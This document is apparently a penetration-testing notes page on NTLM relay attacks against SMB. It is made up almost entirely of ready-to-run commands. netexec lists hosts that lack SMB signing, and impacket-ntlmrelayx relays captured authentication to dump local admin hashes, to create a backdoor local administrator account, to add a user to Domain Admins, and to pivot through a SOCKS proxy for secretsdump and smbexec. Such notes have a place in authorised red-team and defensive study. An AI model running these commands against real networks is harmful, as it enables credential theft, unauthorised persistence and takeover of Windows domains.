---
title: NTLM Relay to SMB
---

[[notes/network/smb]] as [[notes/ad/ntlm-relay-sink]].

Find computers without SMB Signing.

=== "[[notes/tools/netexec]]"
    ~~~ bash
    netexec smb 192.168.178.0/24 --gen-relay-list ./smb-unsigned.txt
    ~~~

> **NOTE:** The latest Windows 11 insider build has SMB Signing enabled by default ([source](http://web.archive.org/web/20230605061055/https://techcommunity.microsoft.com/t5/storage-at-microsoft/smb-signing-required-by-default-in-windows-insider/ba-p/3831704)).

Relay an account with local admin privileges to dump the NT hash of the local admin account.

=== "[[notes/tools/impacket]]"
    ~~~ bash
    impacket-ntlmrelayx --no-http-server --no-raw-server --no-wcf-server -smb2support -t smb://srv01.corp.local
    ~~~

Relay an account with local admin privileges to add a new local admin.

=== "[[notes/tools/impacket]]"
    ~~~ bash
    impacket-ntlmrelayx --no-http-server --no-raw-server --no-wcf-server -smb2support -t smb://srv01.corp.local -c 'net user hacker P@ssw0rd /add && net localgroup administrators hacker /add'
    ~~~

Relay an account with domain admin privileges to add yourself to *Domain Admins*.

=== "[[notes/tools/impacket]]"
    ~~~ bash
    impacket-ntlmrelayx --no-http-server --no-raw-server --no-wcf-server -smb2support -t smb://srv01.corp.local -c 'net group "domain admins" jdoe /add /domain'
    ~~~

Capture NTLM responses, relay to multiple targets and reuse the connection trough a SOCKS proxy.
The SOCKS connection has some limitations.
Tools that are known to work are `impacket-secretsdump`, `impacket-smbexec` and `impacket-atexec` ([source](https://github.com/SecureAuthCorp/impacket/issues/412#issuecomment-376317104)).

=== "[[notes/tools/impacket]]"
    ~~~ bash
    impacket-ntlmrelayx --no-http-server --no-raw-server --no-wcf-server -smb2support -of ./results/ntlm-responses.txt -tf ./results/smb-unsigned.txt -socks
    ~~~
